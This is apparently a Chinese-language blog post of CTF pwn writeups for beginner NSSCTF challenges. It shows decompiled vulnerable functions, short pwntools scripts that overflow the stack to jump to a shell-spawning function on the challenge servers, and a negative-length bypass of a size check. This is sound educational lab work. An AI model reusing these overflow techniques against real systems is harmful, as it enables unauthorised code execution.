---
title: "NSSCTF Pwn刷题 WP"
date: 2024-12-09 19:52:00
categories:
  - "CTF Writeup"
tags:
  - "CTF"
  - "Writeup"
  - "NSSCTF"
  - "Pwn"
cnblogs_postid: "18595910"
cnblogs_url: "https://www.cnblogs.com/ljnljn/p/18595910"
---

# 1、[SWPUCTF 2021 新生赛]nc签到
## 思路
提权
## EXP
```
/bin/sh
cat flag
```
## 总结
nc的使用

# 2、[SWPUCTF 2021 新生赛]gift_pwn
## 思路
ida看存在栈溢出
```
ssize_t vuln()
{
  _BYTE buf[16]; // [rsp+0h] [rbp-10h] BYREF

  return read(0, buf, 0x64uLL);
}
```
![image](/assets/cnblogs/NSSCTF Pwn刷题 WP/3539156-20241209191917415-461292064.png)

gift函数提权
![image](/assets/cnblogs/NSSCTF Pwn刷题 WP/3539156-20241209191808763-2022207866.png)

## EXP
```
from pwn import *
p=remote('node7.anna.nssctf.cn',29687)
payload=b'a'*(0x18)+p64(0x00000000004005C4)
p.sendline(payload)
p.interactive()
```
![image](/assets/cnblogs/NSSCTF Pwn刷题 WP/3539156-20241209191945632-1000012094.png)

## 总结
简单栈溢出
# 3、[LitCTF 2023]只需要nc一下~
这里学到了一个可能藏flag的地方：环境变量
输入```env```就可以看环境变量惹
![image](/assets/cnblogs/NSSCTF Pwn刷题 WP/3539156-20241209192626824-1105474455.png)
（根目录有个假的flag被骗了hhh）
# 4、[NISACTF 2022]ReorPwn?
第一次看到倒着的标题试了一下没想到竟然过了
![image](/assets/cnblogs/NSSCTF Pwn刷题 WP/3539156-20241209192956292-807506559.png)
很明显fun()函数是用来倒置字符串的~~（re是这个意思啊）~~
```
__int64 __fastcall fun(const char *a1)
{
  __int64 result; // rax
  char v2; // [rsp+17h] [rbp-9h]
  int i; // [rsp+18h] [rbp-8h]
  int v4; // [rsp+1Ch] [rbp-4h]

  v4 = strlen(a1);
  for ( i = 0; ; ++i )
  {
    result = (unsigned int)(v4 / 2);
    if ( i >= (int)result )
      break;
    v2 = a1[i];
    a1[i] = a1[v4 - i - 1];
    a1[v4 - i - 1] = v2;
  }
  return result;
}
```
# 5、[SWPUCTF 2022 新生赛]Does your nc work？
纯nc找flag
![image](/assets/cnblogs/NSSCTF Pwn刷题 WP/3539156-20241209193649940-954147699.png)
# 6、[BJDCTF 2020]babystack2.0
buf数组存在栈溢出
```
int __fastcall main(int argc, const char **argv, const char **envp)
{
  _BYTE buf[12]; // [rsp+0h] [rbp-10h] BYREF
  size_t nbytes; // [rsp+Ch] [rbp-4h] BYREF

  setvbuf(_bss_start, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 1, 0LL);
  LODWORD(nbytes) = 0;
  puts("**********************************");
  puts("*     Welcome to the BJDCTF!     *");
  puts("* And Welcome to the bin world!  *");
  puts("*  Let's try to pwn the world!   *");
  puts("* Please told me u answer loudly!*");
  puts("[+]Are u ready?");
  puts("[+]Please input the length of your name:");
  __isoc99_scanf("%d", &nbytes);
  if ( (int)nbytes > 10 )
  {
    puts("Oops,u name is too long!");
    exit(-1);
  }
  puts("[+]What's u name?");
  read(0, buf, (unsigned int)nbytes);
  return 0;
}
```
先要输入一个名字长度，随后第二个可以有栈溢出
> 这里存在漏洞：nbytes 是一个有符号整数（通过 size_t 类型定义，但 __isoc99_scanf 以 %d 格式读取，在比较时做了有符号转换），用户可以输入一个负数作为长度。当输入负数时，在后续 read 函数调用中，由于 read 的第三个参数要求是 size_t 类型（无符号整数类型），负数会被隐式转换为一个很大的无符号整数（例如，-1 转换为无符号数时是一个非常大的值，接近 SIZE_MAX），这样就会导致 read 函数尝试读取远超 buf 数组大小（buf 数组只有 12 字节）的数据，从而引发栈溢出漏洞。
exp
```
from pwn import *
p=remote('node4.anna.nssctf.cn',28608)

payload=b'a'*(0x18)+p64(0x000000000040072A)
p.sendlineafter("name:",b'-1')
p.sendlineafter("name?",payload)
p.interactive()
```
![image](/assets/cnblogs/NSSCTF Pwn刷题 WP/3539156-20241209195015849-337343914.png)
